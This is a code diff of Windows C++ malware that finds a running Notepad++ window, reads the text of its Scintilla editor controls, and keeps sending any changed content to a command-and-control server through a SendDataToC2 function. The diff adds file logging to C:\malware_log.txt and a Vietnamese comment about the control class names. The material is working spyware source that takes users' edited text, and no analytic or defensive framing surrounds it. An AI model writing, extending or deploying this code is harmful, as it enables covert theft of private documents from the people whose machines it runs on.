@@ -1,10 +1,18 @@
-#include <winsock2.h>
 #include <windows.h>
+#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <string>
 #include <vector>
 
 #pragma comment(lib, "ws2_32.lib")
+
+void WriteLog(const std::string& msg) {
+    FILE* f = fopen("C:\\malware_log.txt", "a");
+    if (f) {
+        fprintf(f, "%s\n", msg.c_str());
+        fclose(f);
+    }
+}
 
 bool SendDataToC2(const std::string& data) {
     WSADATA wsaData;
@@ -40,6 +48,7 @@ std::vector<std::string> childTexts;
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
     char className[256];
     GetClassNameA(hwnd, className, sizeof(className));
+    // Kiểm tra cả "Scintilla" và "Scintilla5"
     if (strcmp(className, "Scintilla") == 0 || strcmp(className, "Scintilla5") == 0) {
         int length = SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
         if (length > 0) {
@@ -52,6 +61,7 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 }
 
 DWORD WINAPI ThreadFunc(LPVOID lpParam) {
+    WriteLog("Thread started");
     SendDataToC2("Malware thread started!");
 
     Sleep(1000);
@@ -67,10 +77,12 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam) {
         }, (LPARAM)&hwnd);
 
     if (!hwnd) {
+        WriteLog("Notepad++ not found!");
         SendDataToC2("Notepad++ not found!");
         return 0;
     }
 
+    WriteLog("Notepad++ found!");
     SendDataToC2("Notepad++ found!");
 
     std::string previousText;
@@ -84,6 +96,7 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam) {
         }
 
         if (allText != previousText) {
+            WriteLog("Text changed, sending...");
             SendDataToC2(allText.empty() ? "No text" : allText);
             previousText = allText;
         }
